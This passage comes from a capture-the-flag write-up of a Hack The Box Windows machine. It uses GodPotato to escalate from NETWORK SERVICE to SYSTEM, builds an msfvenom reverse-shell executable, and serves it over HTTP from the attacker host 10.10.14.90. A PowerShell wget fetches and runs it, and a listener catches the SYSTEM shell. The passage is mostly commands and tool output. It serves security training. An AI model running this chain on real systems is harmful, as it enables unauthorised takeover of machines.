+[*] CreateNamedPipe \\.\pipe\0769db82-3516-492c-b16b-16380feb10a8\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000c802-0cdc-ffff-89e2-fc6fe0608d28
+[*] DCOM obj OXID: 0xf7adbad2d4c96063
+[*] DCOM obj OID: 0x3966a93dbd05258a
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 916 Token:0x812  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 3004
+nt authority\system
+SHELL&gt; </code></pre><p>I am now running as NT authority system</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; ./godpotato.exe -cmd &quot;cmd /c whoami/priv&quot;
+[*] CombaseModule: 0x140705258995712
+[*] DispatchTable: 0x140705261301824
+[*] UseProtseqFunction: 0x140705260678352
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\97a6b3c7-275e-46e9-a59f-3234cc69cf41\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00000802-03bc-ffff-54c9-ad9476ea1430
+[*] DCOM obj OXID: 0xf0ea974fdbb08a9f
+[*] DCOM obj OID: 0xa99cd52dc8f89237
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 916 Token:0x812  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 1380
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+SHELL&gt; </code></pre><p>Domain admin!</p><h2>Shell as nt authority system</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=1340 -f exe -o admin-shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: admin-shell.exe</code></pre><p>Ive generated a payload</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 1001
+Serving HTTP on 0.0.0.0 port 1001 (http://0.0.0.0:1001/) ...</code></pre><p>Here i am hosting it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; ./godpotato.exe -cmd &quot;cmd /c  powershell -c wget http://10.10.14.90:1001/admin-shell.exe -o C:\Users\Administrator\Desktop\admin-shell.exe&quot;
+[*] CombaseModule: 0x140705258995712
+[*] DispatchTable: 0x140705261301824
+[*] UseProtseqFunction: 0x140705260678352
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\80087a31-3f96-472d-99bf-584be14272b3\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00006402-0f20-ffff-d22c-d3b121c9759f
+[*] DCOM obj OXID: 0x9532ef76bda17be3
+[*] DCOM obj OID: 0xacffa30c7a9c412f
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 916 Token:0x812  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 3224</code></pre><p>This tranferred it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1340                                                                                
+[+] Listening for reverse shells on 0.0.0.0:1340 -&gt; 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>Ive started a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SHELL&gt; ./godpotato.exe -cmd &quot;cmd /c C:\Users\Administrator\Desktop\admin-shell.exe&quot;</code></pre><p>Now ill execute the payload</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1340                                                                                
+[+] Listening for reverse shells on 0.0.0.0:1340 -&gt; 127.0.0.1 • 192.168.1.150 • 172.17.0.1 • 172.18.0.1 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] • G0 10.129.228.120 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 nt authority\system • Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/G0~10.129.228.120-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_04_01-16_44_28-974.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Temp&gt;whoami
+whoami
+nt authority\system
+
+C:\Temp&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+C:\Temp&gt;</code></pre><p>Full domain compromise!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-delegate/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Delegate</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-fluffy/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Fluffy</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
